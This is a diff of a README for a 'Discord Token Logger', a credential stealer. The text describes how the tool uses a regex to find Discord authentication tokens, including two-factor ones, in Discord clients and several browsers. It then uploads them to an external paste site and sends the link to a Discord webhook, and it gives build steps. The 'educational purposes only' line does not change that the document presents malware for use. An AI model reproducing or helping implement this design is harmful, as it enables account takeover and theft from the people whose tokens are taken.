@@ -1,24 +1,13 @@
+# Changelogs
+ **1. I made a entire new class that will handle the uploading the tokens to the external site. That way we don't have to worry about hitting the character limit for Discord and getting an error.**
+ **2. Instead of using WebClient now I am using HttpClient to send/receive data.**
+ **3. Made the project in .NET 5 since I was facing errors.**
+
 # Discord Token Logger
  **This is made for educational purposes only! Don't use it towards anybody!**
 
 # Building the project
- **Since this was made in .NET 6.0, to build the project you will need to have .NET 6.0 installed. Alternatively if you don't have it installed, you can copy and paste all of the code in older version of .NET.**
-
-# A little bit of information
- **To use a little characters as possible I am using the following abbreviations:**
- > D - Discord
-
- > P - PTB Discord
-
- > C - Canary Discord
-
- > B(B) - Brave Browser
-
- > B(G) - Chrome
-
- > B(I) - Iridium Browser
-
- > Two-Factor Authentication tokens are being sent with different Webhook username.
+ **Download the source, open the solution file and compile as Release**
 
 # How it works - **Token** class
  > We declare our regex pattern which will be used to search for tokens in Discord, PTB Discord, Canary Discord and some browser destinations. Instead of using two separated ones I am using one that does the same job.
@@ -27,12 +16,14 @@
 
  > Normal tokens and tokens with two-factor authentication are separated in different StringBuilders.
 
- > When all found tokens are added we're moving to the part where we're sending the tokens to a Discord Webhook.
+ > We concatenate all tokens in one variable.
 
- > There is a **limitation**. If there are over 2000 characters the tokens will not be sent.
+ > If uploading to the external site have been successful, we are sending the link to the Discord WebHook.
+
+# How it works - **Paste** class
+ > A class where we make a POST and GET request to the external site.
+ > We make POST request to the site to upload our tokens.
+ > We wait for GET request to receive information and find our link using regex pattern. Afterwards we save that link in a variable.
 
 # How it works - **Program** class
  > We create a class instance also known as Object so we can access our methods.
-
-# How it works - **Using** class
- > A class for **Global Using Statements**. Read more about it [here](https://dotnetcoretutorials.com/2021/08/19/global-using-statements-in-c10/ "Global Using Statements").
